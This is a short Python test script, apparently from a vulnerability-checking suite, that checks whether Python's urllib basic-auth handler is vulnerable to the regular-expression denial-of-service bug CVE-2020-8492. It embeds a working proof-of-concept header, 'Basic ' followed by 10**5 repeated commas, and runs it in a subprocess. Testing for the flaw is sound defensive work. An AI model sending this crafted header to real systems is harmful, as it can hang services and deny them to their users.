from vulntools import Test


CODE = """
from urllib.request import AbstractBasicAuthHandler


# 2020-07-01: Vulnerable Python:
#
# - REPEAT=10: 300 ms
# - REPEAT=20: 3.9 sec
# - REPEAT=30 takes longer than 3 minutes.
#
# REPEAT=10**5 is likely to take longer than 30 seconds on any computer.
REPEAT = 10 ** 5
HTTP_HEADER = 'Basic ' + ', ' * REPEAT + 'A'


class AuthHandler(AbstractBasicAuthHandler):
    handler = None
    realm = None

    def retry_http_basic_auth(self, host, req, realm):
        self.realm = realm
        return None

class Headers:
    def __init__(self, header):
        self.header = header

    def get(self, *ignored_args):
        return self.header

    def get_all(self, *ignored_args):
        return [self.header]


host = None
req = None
headers = Headers(HTTP_HEADER)
handler = AuthHandler()
handler.http_error_auth_reqed("WWW-Authenticate", host, req, headers)
"""


class Check(Test):
    NAME = "urllib basic auth regex denial of service (CVE-2020-8492)"
    SLUG = "urllib-basic-auth-regex"

    def run(self):
        self.check_subprocess_denial_service(CODE)


if __name__ == "__main__":
    Check().main()
